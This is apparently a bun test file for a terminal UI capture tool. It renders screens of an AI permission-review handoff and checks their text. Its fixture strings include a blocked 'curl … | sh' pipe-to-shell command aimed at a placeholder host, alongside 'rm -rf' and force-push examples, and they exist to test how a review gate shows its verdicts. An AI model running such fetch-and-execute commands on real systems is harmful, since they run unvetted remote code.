import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import type { CapturedFrame, CapturedSpan } from "@opentui/core";
import type { ScreenName } from "../scripts/capture/screens.ts";
import type { HandoffTrigger } from "../src/types.ts";
// Registers the Solid transform before any TUI module loads (see tests/tui-loader.ts); the
// capture modules are imported dynamically after it for the same reason.
import "./tui-loader.ts";

const { RGBA, TextAttributes }: typeof import("@opentui/core") = await import(
  "@opentui/core"
);
const { frameToAnsi, textRow }: typeof import("../scripts/capture/ansi.ts") =
  await import("../scripts/capture/ansi.ts");
const { handoffStatus }: typeof import("../scripts/capture/fixtures.ts") =
  await import("../scripts/capture/fixtures.ts");
const { renderScreen }: typeof import("../scripts/capture/screens.ts") =
  await import("../scripts/capture/screens.ts");

const ROOT = join(import.meta.dir, "..");

/** The text of ANSI output, without its SGR sequences. */
function plain(text: string): string {
  return text
    .split("\u001b")
    .map((part, index) =>
      index === 0 ? part : part.replace(/^\[[0-9;]*m/, ""),
    )
    .join("");
}

function runCapture(...args: string[]): Bun.SyncSubprocess<"pipe", "pipe"> {
  return Bun.spawnSync([process.execPath, "scripts/capture-tui.ts", ...args], {
    cwd: ROOT,
    stdout: "pipe",
    stderr: "pipe",
    timeout: 60_000,
  });
}

const ESC = "\u001b[";
type Color = ReturnType<typeof RGBA.fromHex>;

function span(
  text: string,
  fg: Color,
  bg: Color,
  attributes = 0,
): CapturedSpan {
  return { text, fg, bg, attributes, width: text.length };
}

describe("capture: ANSI conversion", () => {
  const panel = RGBA.fromHex("#141414");
  const clear = RGBA.fromValues(0, 0, 0, 0);
  const green = RGBA.fromHex("#7fd88f");
  const white = RGBA.fromHex("#ffffff");

  test("drops unpainted rows and writes truecolor SGR per span", () => {
    const frame: CapturedFrame = {
      cols: 4,
      rows: 3,
      cursor: [0, 0],
      lines: [
        { spans: [span("    ", white, clear)] },
        {
          spans: [
            span("ok", green, panel, TextAttributes.BOLD),
            span("  ", white, panel),
          ],
        },
        { spans: [span("hi", green, clear), span("  ", white, clear)] },
      ],
    };
    expect(frameToAnsi(frame)).toEqual([
      `${ESC}0m${ESC}38;2;127;216;143m${ESC}48;2;20;20;20m${ESC}1mok${ESC}0m${ESC}38;2;255;255;255m${ESC}48;2;20;20;20m  ${ESC}0m`,
      `${ESC}0m${ESC}38;2;127;216;143mhi${ESC}0m${ESC}38;2;255;255;255m  ${ESC}0m`,
    ]);
  });

  test("returns no rows when nothing was painted", () => {
    const frame: CapturedFrame = {
      cols: 2,
      rows: 1,
      cursor: [0, 0],
      lines: [{ spans: [span("  ", white, clear)] }],
    };
    expect(frameToAnsi(frame)).toEqual([]);
  });

  test("colors plain text rows from hex", () => {
    expect(
      textRow([
        { text: "Manual review required", fg: "#f5a742" },
        { text: " (warning)", fg: "#606060" },
      ]),
    ).toBe(
      `${ESC}38;2;245;167;66mManual review required${ESC}38;2;96;96;96m (warning)${ESC}0m`,
    );
  });
});

// The strings come from the spec's section 3 tables; the docs quote them.
const SCREEN_TEXT: ReadonlyArray<readonly [ScreenName, readonly string[]]> = [
  [
    "handoff-progress",
    [
      "Reviewing this permission · gpt-6-luna after Jev's escalation · medium",
      "git push --force-with-lease origin release/2.4",
    ],
  ],
  [
    "result-attribution",
    [
      "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache",
      "jev-1.13.0 — Narrowly scoped temp cleanup",
      "gpt-6-luna after Jev's escalation — The user asked",
      "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh",
      "gpt-6-luna confirmed Jev's denial — Pipes a remote script",
    ],
  ],
  [
    "v1-overlay-handoff",
    [
      "gpt-6-luna · reasoning medium · after Jev failed (timeout)",
      "No action needed",
    ],
  ],
  [
    "result-triggers",
    [
      "gpt-6-luna after Jev's uncertain approval",
      "gpt-6-luna after a safety gate stopped Jev's approval",
      "gpt-6-luna after Jev's invalid response",
      "gpt-6-luna after Jev failed (timeout)",
      "gpt-6-luna overturned Jev's denial",
      "gpt-6-luna confirmed Jev's denial",
      "Review blocked (fail-closed)",
    ],
  ],
  ["long-command-after", ["https://setup.invalid | sh", "40-line heredoc"]],
  [
    "manual-toasts",
    [
      "gpt-6-luna reviewed this after Jev; it needs your approval: The force-push would rewrite",
      "Reasoning reviewer unavailable",
      "gpt-6-luna failed (timeout). This permission needs your approval.",
      "This permission needs your approval.",
      "No review time left for gpt-6-luna after Jev (Jev escalated).",
      "No review time left for gpt-6-luna after Jev",
      "resolution budget-exhausted, as the V1 host shows it",
      "Manual review required",
      "OpenCode draws the frame",
    ],
  ],
  [
    "config-warnings",
    [
      'systemOneEscalation "reasoning-first" is inactive',
      "global config file is malformed and was ignored",
      "sidebar line, several warnings",
      "healthy config: no toast and no sidebar line",
    ],
  ],
];

describe("capture: screens", () => {
  test.each(SCREEN_TEXT)(
    "%s shows the text the docs quote",
    async (screen, expected) => {
      const text = plain((await renderScreen(screen)).join("\n"));
      for (const fragment of expected) expect(text).toContain(fragment);
    },
    30_000,
  );

  test("rejects a sample the TUI would not accept", () => {
    expect(() =>
      handoffStatus("jev-bogus" as HandoffTrigger, {
        command: "printf safe",
        phase: "reviewing",
      }),
    ).toThrow("does not decode");
  });
});

describe("capture: CLI", () => {
  test("prints one screen as ANSI at the pinned clock and exits", () => {
    const result = runCapture("handoff-progress");
    expect(result.exitCode).toBe(0);
    const text = result.stdout.toString();
    expect(text.startsWith("\u001b[")).toBe(true);
    expect(plain(text)).toContain("7.3s");
  }, 60_000);

  test("rejects an unknown screen with usage and an empty stdout", () => {
    const result = runCapture("no-such-screen");
    expect(result.exitCode).toBe(2);
    expect(result.stdout.toString()).toBe("");
    expect(result.stderr.toString()).toContain(
      "usage: bun scripts/capture-tui.ts <handoff-progress",
    );
  }, 60_000);
});
